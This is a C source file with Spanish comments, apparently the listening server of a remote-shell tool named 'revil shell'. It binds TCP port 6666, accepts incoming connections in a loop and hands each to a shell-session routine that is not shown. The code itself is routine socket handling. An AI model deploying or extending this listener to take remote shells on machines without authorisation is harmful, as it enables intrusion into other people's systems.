#include "../include/servidor.h"

int main(int argc, char *argv[]){
  /* Registrando rutina manejadora de señales */

  struct sigaction sa_sigint;
  struct sigaction sa_sigpipe;

  sa_sigint.sa_handler = sig_handler;
  sa_sigint.sa_flags = SA_RESTART;
  if(sigaction(SIGINT, &sa_sigint, NULL) == -1)
  {
    printf("No se pudo registrar el manejador para Ctrl-C\n");
  }
  sa_sigpipe.sa_handler = sig_handler;
  sa_sigpipe.sa_flags = SA_RESTART;
  if(sigaction(SIGPIPE, &sa_sigpipe, NULL) == -1)
  {
    printf("No se pudo registrar el manejador para SIGPIPE\n");
  }
  
  puerto = 6666;
  printf("\nIniciando servidor revil shell...\n");
  socket_des = crear_socket_servidor(puerto);
  if (socket_des == -1 )
  {
    perror("Error abriendo el socket");
    return -1;
  }
  printf(">>> El servidor revil_shell está escuchando.\n");
  int cliente_descriptor;
  do {
    cliente_descriptor = escuchar_clientes_nuevos();
    iniciar_shell(cliente_descriptor);
  }while(1);
  return 0;
}

/*
#########################################
#					#
#		Métodos			#
#					#
#########################################
*/

int crear_socket_servidor(int puerto)
{
  int sck = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in s_addin;
  s_addin.sin_family = AF_INET;
  s_addin.sin_port = htons(puerto);
  s_addin.sin_addr.s_addr = htonl(INADDR_ANY);
  bzero(&(s_addin.sin_zero),8);
  
  bind(sck,(struct sockaddr *)&s_addin, sizeof(struct sockaddr));
  listen(sck,1);
  return sck;
}

int escuchar_clientes_nuevos(void)
{
  struct sockaddr_in host_cliente;
  int longitud = sizeof(struct sockaddr);
  printf("Esperando conexión...\n");
  int cliente_des = accept(socket_des, (struct sockaddr *)(&host_cliente), &longitud);
  printf("Conexión entrante...\n");
  if(cliente_des==-1)
  {
    printf("No se pudo establecer la conexión\n");
    return -1;
  }
  printf(">>> Establecida la conexión con: %s\n", inet_ntoa(host_cliente.sin_addr));
  return cliente_des;
}

void sig_handler(int signal)
{
  switch(signal)
  {
    case SIGINT:
      //Se precionó Ctrl-C
      printf(" Apagando el servidor...\n");
      close(socket_des);
      exit(0);
      break;
    case SIGPIPE:
      printf("[x] Se ha perdido la conexión con el cliente\n\n");
      terminar_shell();
      break;
    default: break;
  }
  return;
}